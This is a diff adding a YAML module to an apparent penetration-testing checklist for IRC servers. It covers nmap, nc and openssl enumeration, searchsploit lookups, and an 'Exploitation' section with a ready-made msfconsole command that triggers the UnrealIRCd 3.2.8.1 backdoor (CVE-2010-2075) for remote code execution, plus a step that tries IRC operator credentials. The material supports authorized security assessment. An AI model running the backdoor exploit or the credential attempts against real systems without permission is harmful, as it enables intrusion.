@@ -1,0 +1,65 @@
+module: irc
+name: IRC (6667 / 6697)
+inputs: [PASS, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / ircd software + version
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          nmap -p$PORT --script=irc-info $IP
+      - id: connect
+        text: Connect and read MOTD / server banner
+        commands: |
+          nc -nv $IP $PORT
+          irssi -c $IP -p $PORT
+      - id: connect_tls
+        text: Connect over TLS (6697)
+        tls_only: true
+        commands: |
+          openssl s_client -connect $IP:$PORT
+
+  - id: enum
+    name: Enumeration
+    steps:
+      - id: channels
+        text: List channels and users
+        manual: true
+        commands: |
+          # after NICK/USER handshake:  LIST   ,   WHO *   ,   NAMES #channel
+      - id: server_info
+        text: Server / operator / linked-server info
+        manual: true
+        commands: |
+          # VERSION , INFO , LINKS , STATS
+
+  - id: vuln
+    name: Vulnerability Identification
+    steps:
+      - id: unrealircd
+        text: UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075)
+        commands: |
+          nmap -p$PORT --script=irc-unrealircd-backdoor $IP
+      - id: cve_map
+        text: Version to CVE mapping (InspIRCd, ngIRCd, etc.)
+        commands: |
+          searchsploit unrealircd
+          searchsploit ircd
+
+  - id: exploit
+    name: Exploitation
+    authorized: true
+    steps:
+      - id: unreal_rce
+        text: Trigger the UnrealIRCd backdoor (RCE)
+        commands: |
+          msfconsole -qx "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS $IP; set RPORT $PORT; run; exit"
+      - id: oper
+        text: Try IRC operator creds (config / privilege escalation on ircd)
+        manual: true
+        commands: |
+          # OPER <name> <pass>   using discovered/default operator creds
